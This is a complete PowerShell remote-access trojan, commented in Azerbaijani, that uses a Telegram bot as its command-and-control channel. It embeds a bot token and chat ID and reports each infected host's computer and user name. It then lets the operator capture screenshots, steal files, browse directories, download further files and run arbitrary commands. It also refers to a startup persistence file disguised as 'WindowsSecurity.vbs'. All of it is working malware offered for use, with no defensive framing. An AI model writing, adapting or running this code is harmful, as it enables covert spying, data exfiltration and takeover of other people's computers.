$token = "8817701294:AAGtc6EO7ln-vZ88RsH_IC76z5N5nmOzQLc"
$chatId = "7432282760"
$apiUrl = "https://api.telegram.org/bot$token"

$lastUpdateId = 0
$currentDir = "C:\"

# --- Köməkçi: mesaj göndər ---
function Send-Message($text) {
    if ($text.Length -gt 4000) { $text = $text.Substring(0, 4000) + "... (kəsildi)" }
    try { Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{chat_id=$chatId; text=$text} -TimeoutSec 10 -ErrorAction Stop | Out-Null } catch {}
}

# --- Köməkçi: fayl göndər ---
function Send-File($filePath) {
    if (-not (Test-Path $filePath)) { Send-Message "Xeta: Fayl tapilmadi - $filePath"; return }
    try {
        Add-Type -AssemblyName System.Net.Http
        [byte[]]$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $client = [System.Net.Http.HttpClient]::new()
        $client.Timeout = [TimeSpan]::FromSeconds(120)
        $content = [System.Net.Http.MultipartFormDataContent]::new()
        $content.Add([System.Net.Http.StringContent]::new("$chatId"), "chat_id")
        $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
        $content.Add($fileContent, "document", $fileName)
        $response = $client.PostAsync("$apiUrl/sendDocument", $content).Result
        $client.Dispose(); $content.Dispose()
        if ($response.IsSuccessStatusCode) { Send-Message "Fayl gonderildi: $fileName" }
        else { Send-Message "Xeta: HTTP $($response.StatusCode)" }
    } catch { Send-Message "Xeta: $_" }
}

# --- Köməkçi: ekran şəkli ---
function Send-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Net.Http
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $graphics.Dispose()
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        [byte[]]$fileBytes = $ms.ToArray()
        $ms.Dispose()
        $client = [System.Net.Http.HttpClient]::new()
        $client.Timeout = [TimeSpan]::FromSeconds(60)
        $content = [System.Net.Http.MultipartFormDataContent]::new()
        $content.Add([System.Net.Http.StringContent]::new("$chatId"), "chat_id")
        $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
        $content.Add($fileContent, "photo", "ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png")
        $response = $client.PostAsync("$apiUrl/sendPhoto", $content).Result
        $client.Dispose(); $content.Dispose()
        if ($response.IsSuccessStatusCode) { Send-Message "Ekran sekli gonderildi" }
        else { Send-Message "Xeta: HTTP $($response.StatusCode)" }
    } catch { Send-Message "Xeta: $_" }
}

# --- Başlanğıc mesajı ---
Send-Message "C2 basladi: $env:COMPUTERNAME ($env:USERNAME) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

# --- Əsas dövrə ---
while ($true) {
    try {
        $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=30" -Method Get -TimeoutSec 40 -ErrorAction Stop
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $lastUpdateId = $update.update_id
                if ("$($update.message.chat.id)" -eq "$chatId") {
                    $command = $update.message.text
                    if ([string]::IsNullOrWhiteSpace($command)) { continue }
                    $cmd = $command.Trim()

                    if ($cmd -eq "/help" -or $cmd -eq "/start") {
                        Send-Message @"
Telegram C2 - Emrler:
/help - bu mesaj
/ss - ekran sekli
/file <path> - qovluqdaki fayllari siyahila
/get <path> - fayli gonder
/cd <path> - cari qovlugu deyis
/download <url> <path> - URL-den fayl yukle
/exit - skripti dayandir ve sil
<emr> - istenilen PowerShell emri
"@
                        continue
                    }

                    if ($cmd -eq "/ss") { Send-Message "Ekran sekli cekilir..."; Send-Screenshot; continue }

                    if ($cmd -like "/file *") {
                        $path = $cmd.Substring(6).Trim()
                        $fullPath = if ([System.IO.Path]::IsPathRooted($path)) { $path } else { Join-Path $currentDir $path }
                        if (Test-Path $fullPath) {
                            $items = Get-ChildItem -Path $fullPath -ErrorAction SilentlyContinue
                            if ($items) {
                                $list = "Qovluq: $fullPath`n`n"
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "[DIR]" } else { "[FILE]" }
                                    $size = if ($item.PSIsContainer) { "" } else { " ($([math]::Round($item.Length/1KB, 2)) KB)" }
                                    $list += "$type $($item.Name)$size`n"
                                }
                                Send-Message $list
                            } else { Send-Message "Qovluq: $fullPath - bosdur" }
                        } else { Send-Message "Xeta: Qovluq tapilmadi" }
                        continue
                    }

                    if ($cmd -like "/get *") {
                        $path = $cmd.Substring(5).Trim()
                        $fullPath = if ([System.IO.Path]::IsPathRooted($path)) { $path } else { Join-Path $currentDir $path }
                        Send-File $fullPath
                        continue
                    }

                    if ($cmd -like "/cd *") {
                        $path = $cmd.Substring(4).Trim()
                        $fullPath = if ([System.IO.Path]::IsPathRooted($path)) { $path } else { Join-Path $currentDir $path }
                        if (Test-Path $fullPath -PathType Container) {
                            $script:currentDir = (Resolve-Path $fullPath).Path
                            $items = Get-ChildItem -Path $currentDir -ErrorAction SilentlyContinue
                            $list = "Cari qovluq: $currentDir`n`n"
                            if ($items) {
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "[DIR]" } else { "[FILE]" }
                                    $size = if ($item.PSIsContainer) { "" } else { " ($([math]::Round($item.Length/1KB, 2)) KB)" }
                                    $list += "$type $($item.Name)$size`n"
                                }
                            } else { $list += "(bosdur)" }
                            Send-Message $list
                        } else { Send-Message "Xeta: Qovluq tapilmadi" }
                        continue
                    }

                    if ($cmd -like "/download *") {
                        $parts = $cmd.Substring(10).Trim() -split '\s+', 2
                        if ($parts.Count -lt 2) { Send-Message "Istifade: /download <url> <path>"; continue }
                        $url = $parts[0]; $savePath = $parts[1]
                        if ($url -notmatch '^https?://') { Send-Message "Xeta: Yalniz http/https"; continue }
                        $fullPath = if ([System.IO.Path]::IsPathRooted($savePath)) { $savePath } else { Join-Path $currentDir $savePath }
                        try {
                            Invoke-WebRequest -Uri $url -OutFile $fullPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
                            Send-Message "Yuklendi: $fullPath"
                        } catch { Send-Message "Xeta: $_" }
                        continue
                    }

                    if ($cmd -eq "/exit") {
                        $startupFolder = [Environment]::GetFolderPath('Startup')
                        $vbsPath = Join-Path $startupFolder "WindowsSecurity.vbs"
                        Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
                        Send-Message "C2 dayandirilir, VBS startup-dan silindi"
                        exit
                    }

                    try {
                        $output = Invoke-Expression $cmd 2>&1 | Out-String
                        if ([string]::IsNullOrWhiteSpace($output)) { $output = "[Emr icra olundu, cixis yoxdur]" }
                    } catch { $output = "Xeta: $_" }
                    Send-Message $output
                }
            }
        }
    } catch { Start-Sleep -Seconds 10 }
    Start-Sleep -Seconds 2
}
